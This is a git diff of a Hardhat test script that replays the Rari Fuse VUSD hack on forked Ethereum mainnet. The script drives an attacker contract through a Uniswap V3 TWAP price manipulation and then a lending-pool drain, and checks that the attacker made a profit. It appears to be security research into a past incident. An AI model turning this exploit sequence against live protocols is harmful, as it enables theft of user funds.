@@ -24,9 +24,6 @@ Minter.sol (USDC to VUSD): https://etherscan.io/address/0xb652fc42e12828f3f1b3e9
 let accounts: Signer[];
 let attackerEOA: Signer;
 let attacker: Contract;
-let fuseVUSD: Contract;
-let vusdMinter: Contract;
-let usdc: Contract;
 let tx: ContractTransaction;
 let firstTxBlock = 13537922;
 let secondTxBlock = 13537933;
@@ -36,15 +33,6 @@ before(async () => {
 
   accounts = await ethers.getSigners();
   [attackerEOA] = accounts;
-
-  fuseVUSD = await ethers.getContractAt(
-    `IFToken`,
-    `0x2914e8c1c2c54e5335dc9554551438c59373e807`
-  );
-  usdc = await ethers.getContractAt(
-    `contracts/interfaces/IERC20.sol:IERC20`,
-    `0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48`
-  );
 
   const attackerFactory = await ethers.getContractFactory(
     getAttackerContractName(__filename),
@@ -112,28 +100,22 @@ describe.skip("Rari Fuse VUSD Hack TWAP price replay", function () {
 describe("Rari Fuse VUSD Hack", function () {
   it("performs the attack", async function () {
     let initialEthBalance = await attackerEOA.getBalance();
+
     tx = await attacker.connect(attackerEOA).manipulateUniswapV3({
       value: ethers.utils.parseEther(`1000`),
-      gasLimit: `15000000`,
-      gasPrice: ethers.utils.parseUnits(`200`, 9),
     });
     // make sure it's mined, don't want to batch it with next tx
     await tx.wait();
 
     // now wait 1 block, ~13 seconds, for TWAP manipulation to kick in, 18.0 USDC/VUSD price
-    // it's much more efficient to wait ~30 seconds for a 1,800.0 USDC/VUSD price
-    await network.provider.send("evm_increaseTime", [13]);
-
-    tx = await attacker.connect(attackerEOA).fuseAttack({
-      gasLimit: `15000000`,
-      gasPrice: ethers.utils.parseUnits(`200`, 9),
-    });
+    // it's much more efficient to wait ~30 seconds for a 490.0 USDC/VUSD price
+    await network.provider.send("evm_increaseTime", [30]);
+    tx = await attacker.connect(attackerEOA).fuseAttack();
 
     let finalEthBalance = await attackerEOA.getBalance();
     let profit = finalEthBalance.sub(initialEthBalance);
-    console.log(`Profit: ${ethers.utils.formatEther(profit)} ETH`)
-    expect(profit, "attacker wrong balance").gt(
-      `0`
-    );
+    console.log(`Profit: ${ethers.utils.formatEther(profit)} ETH`);
+
+    expect(profit, "attacker wrong balance").gt(`0`);
   });
 });
